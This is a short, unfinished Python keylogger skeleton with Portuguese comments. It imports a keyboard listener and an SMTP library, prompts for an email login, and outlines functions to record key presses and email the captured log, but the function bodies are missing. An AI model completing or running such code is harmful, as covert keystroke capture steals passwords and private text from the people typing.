'''
Author: Mateus Tito Burnett
'''

import getpass
import smtplib # biblio para usar protocolo smtp

from pynput.keyboard import Key, Listener

print("\nRun...\n")

# configurando email...

email = input('Digite o email: ')
password = getpass.getpass(prompt='Password: ', stream=None)

# configurando log para armazenar as capturas

full_log = ''
word = ''
email_char_limit = 20 # limite dos caracteres

'''

# registrar a captura da tecla
def on_press(key):

# enviar o log capturado para o email
def send_log():

'''